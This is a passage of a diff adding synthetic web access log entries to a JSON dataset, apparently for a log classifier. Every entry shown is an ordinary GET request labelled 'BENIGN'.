+    "raw": "192.168.1.181 - - [01/Jun/2026:10:12:22 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.182 - - [01/Jun/2026:10:12:24 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.183 - - [01/Jun/2026:10:12:26 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.184 - - [01/Jun/2026:10:12:28 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.185 - - [01/Jun/2026:10:12:30 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.186 - - [01/Jun/2026:10:12:32 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.187 - - [01/Jun/2026:10:12:34 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.188 - - [01/Jun/2026:10:12:36 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.189 - - [01/Jun/2026:10:12:38 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.190 - - [01/Jun/2026:10:12:40 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.191 - - [01/Jun/2026:10:12:42 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.192 - - [01/Jun/2026:10:12:44 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.193 - - [01/Jun/2026:10:12:46 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.194 - - [01/Jun/2026:10:12:48 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.195 - - [01/Jun/2026:10:12:50 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.196 - - [01/Jun/2026:10:12:52 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.197 - - [01/Jun/2026:10:12:54 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.198 - - [01/Jun/2026:10:12:56 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.199 - - [01/Jun/2026:10:12:58 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.200 - - [01/Jun/2026:10:13:00 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.201 - - [01/Jun/2026:10:13:02 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.202 - - [01/Jun/2026:10:13:04 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.203 - - [01/Jun/2026:10:13:06 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.204 - - [01/Jun/2026:10:13:08 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.205 - - [01/Jun/2026:10:13:10 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.206 - - [01/Jun/2026:10:13:12 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.207 - - [01/Jun/2026:10:13:14 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.208 - - [01/Jun/2026:10:13:16 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.209 - - [01/Jun/2026:10:13:18 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.10 - - [01/Jun/2026:10:13:20 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.11 - - [01/Jun/2026:10:13:22 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.12 - - [01/Jun/2026:10:13:24 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.13 - - [01/Jun/2026:10:13:26 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.14 - - [01/Jun/2026:10:13:28 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.15 - - [01/Jun/2026:10:13:30 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.16 - - [01/Jun/2026:10:13:32 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.17 - - [01/Jun/2026:10:13:34 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.18 - - [01/Jun/2026:10:13:36 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.19 - - [01/Jun/2026:10:13:38 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.20 - - [01/Jun/2026:10:13:40 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.21 - - [01/Jun/2026:10:13:42 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.22 - - [01/Jun/2026:10:13:44 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.23 - - [01/Jun/2026:10:13:46 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.24 - - [01/Jun/2026:10:13:48 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.25 - - [01/Jun/2026:10:13:50 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.26 - - [01/Jun/2026:10:13:52 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.27 - - [01/Jun/2026:10:13:54 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.28 - - [01/Jun/2026:10:13:56 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.29 - - [01/Jun/2026:10:13:58 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.30 - - [01/Jun/2026:10:14:00 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.31 - - [01/Jun/2026:10:14:02 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.32 - - [01/Jun/2026:10:14:04 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.33 - - [01/Jun/2026:10:14:06 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.34 - - [01/Jun/2026:10:14:08 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.35 - - [01/Jun/2026:10:14:10 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.36 - - [01/Jun/2026:10:14:12 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.37 - - [01/Jun/2026:10:14:14 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.38 - - [01/Jun/2026:10:14:16 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.39 - - [01/Jun/2026:10:14:18 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.40 - - [01/Jun/2026:10:14:20 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.41 - - [01/Jun/2026:10:14:22 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.42 - - [01/Jun/2026:10:14:24 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.43 - - [01/Jun/2026:10:14:26 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.44 - - [01/Jun/2026:10:14:28 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.45 - - [01/Jun/2026:10:14:30 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.46 - - [01/Jun/2026:10:14:32 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.47 - - [01/Jun/2026:10:14:34 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.48 - - [01/Jun/2026:10:14:36 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.49 - - [01/Jun/2026:10:14:38 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.50 - - [01/Jun/2026:10:14:40 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.51 - - [01/Jun/2026:10:14:42 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.52 - - [01/Jun/2026:10:14:44 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.53 - - [01/Jun/2026:10:14:46 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.54 - - [01/Jun/2026:10:14:48 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.55 - - [01/Jun/2026:10:14:50 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.56 - - [01/Jun/2026:10:14:52 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.57 - - [01/Jun/2026:10:14:54 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.58 - - [01/Jun/2026:10:14:56 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.59 - - [01/Jun/2026:10:14:58 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.60 - - [01/Jun/2026:10:15:00 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.61 - - [01/Jun/2026:10:15:02 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.62 - - [01/Jun/2026:10:15:04 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.63 - - [01/Jun/2026:10:15:06 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.64 - - [01/Jun/2026:10:15:08 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.65 - - [01/Jun/2026:10:15:10 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.66 - - [01/Jun/2026:10:15:12 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.67 - - [01/Jun/2026:10:15:14 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.68 - - [01/Jun/2026:10:15:16 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.69 - - [01/Jun/2026:10:15:18 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.70 - - [01/Jun/2026:10:15:20 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.71 - - [01/Jun/2026:10:15:22 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.72 - - [01/Jun/2026:10:15:24 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.73 - - [01/Jun/2026:10:15:26 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.74 - - [01/Jun/2026:10:15:28 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.75 - - [01/Jun/2026:10:15:30 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.76 - - [01/Jun/2026:10:15:32 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.77 - - [01/Jun/2026:10:15:34 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.78 - - [01/Jun/2026:10:15:36 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.79 - - [01/Jun/2026:10:15:38 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.80 - - [01/Jun/2026:10:15:40 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.81 - - [01/Jun/2026:10:15:42 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.82 - - [01/Jun/2026:10:15:44 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.83 - - [01/Jun/2026:10:15:46 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.84 - - [01/Jun/2026:10:15:48 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.85 - - [01/Jun/2026:10:15:50 +0000] \"GET /checkout/shipping HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.86 - - [01/Jun/2026:10:15:52 +0000] \"GET /faq HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.87 - - [01/Jun/2026:10:15:54 +0000] \"GET /services HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.88 - - [01/Jun/2026:10:15:56 +0000] \"GET /pricing HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.89 - - [01/Jun/2026:10:15:58 +0000] \"GET /favicon.ico HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.90 - - [01/Jun/2026:10:16:00 +0000] \"GET / HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.91 - - [01/Jun/2026:10:16:02 +0000] \"GET /index.html HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.92 - - [01/Jun/2026:10:16:04 +0000] \"GET /about.us HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.93 - - [01/Jun/2026:10:16:06 +0000] \"GET /contact HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.94 - - [01/Jun/2026:10:16:08 +0000] \"GET /products HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.95 - - [01/Jun/2026:10:16:10 +0000] \"GET /categories?cat=electronics HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.96 - - [01/Jun/2026:10:16:12 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.97 - - [01/Jun/2026:10:16:14 +0000] \"GET /images/logo.png HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.98 - - [01/Jun/2026:10:16:16 +0000] \"GET /static/css/theme.css HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.99 - - [01/Jun/2026:10:16:18 +0000] \"GET /static/js/bundle.js HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.100 - - [01/Jun/2026:10:16:20 +0000] \"GET /api/v1/health HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.101 - - [01/Jun/2026:10:16:22 +0000] \"GET /api/v1/status HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.102 - - [01/Jun/2026:10:16:24 +0000] \"GET /blog/post/2026/05/security-updates HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.103 - - [01/Jun/2026:10:16:26 +0000] \"GET /docs HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
+  {
+    "raw": "192.168.1.104 - - [01/Jun/2026:10:16:28 +0000] \"GET /cart/view HTTP/1.1\" 200 4096 \"https://google.com\" \"Mozilla/5.0\"",
+    "label": "BENIGN",
+    "category": "BENIGN"
+  },
